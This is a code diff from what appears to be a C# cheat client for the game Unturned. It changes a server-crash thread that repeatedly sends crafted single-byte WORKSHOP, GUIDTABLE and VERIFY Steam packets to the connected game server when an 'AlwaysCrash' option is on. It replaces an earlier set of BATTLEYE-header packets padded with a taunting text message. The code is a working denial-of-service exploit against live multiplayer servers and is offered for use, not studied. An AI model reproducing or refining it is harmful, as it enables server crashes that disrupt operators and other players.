@@ -3,6 +3,7 @@ using System.Collections.Generic;
 using System.Linq;
 using System.Text;
 using System.Threading;
+using System.Xml.Schema;
 using SDG.Unturned;
 using Steamworks;    
 using Thanking.Attributes;
@@ -27,25 +28,14 @@ namespace Thanking.Threads
                 OV_Provider.IsConnected = false;
             };
 
-            byte[] meme =
-                Encoding.ASCII.GetBytes("I actually found another~3similarexploitswhicharenowpatched as well");
-
-            List<byte> M1 = new List<byte> {(byte) ESteamPacket.BATTLEYE };
-            List<byte> M2 = new List<byte> {(byte) ESteamPacket.WORKSHOP };
-            List<byte> M3 = new List<byte> {(byte) ESteamPacket.GUIDTABLE };
-            
-            M1.AddRange(meme.ToList());
-            M2.AddRange(meme.ToList());
-            M3.AddRange(meme.ToList());
-
-            byte[] P1 = M1.ToArray();
-            byte[] P2 = M2.ToArray();
-            byte[] P3 = M3.ToArray();
+            byte[] P1 = {(byte) ESteamPacket.WORKSHOP};
+            byte[] P2 = {(byte) ESteamPacket.GUIDTABLE};
+            byte[] P3 = {(byte) ESteamPacket.VERIFY};
 
             int S1 = P1.Length;
             int S2 = P2.Length;
             int S3 = P3.Length;
-
+            
             while (true)
             {
                 if (AlwaysCrash && OV_Provider.IsConnected)
@@ -56,13 +46,13 @@ namespace Thanking.Threads
                     switch (MiscOptions.SCrashMethod)
                     {
                         case 1:
-                            Provider.send(Provider.server, ESteamPacket.BATTLEYE, P1, S1, 0);
+                            Provider.send(Provider.server, ESteamPacket.WORKSHOP, P1, S1, 0);
                             break;
                         case 2:
-                            Provider.send(Provider.server, ESteamPacket.BATTLEYE, P2, S2, 0);
+                            Provider.send(Provider.server, ESteamPacket.GUIDTABLE, P2, S2, 0);
                             break;
                         case 3:
-                            Provider.send(Provider.server, ESteamPacket.BATTLEYE, P3, S3, 0);
+                            Provider.send(Provider.server, ESteamPacket.VERIFY, P3, S3, 0);
                             break;
                     }
                 }
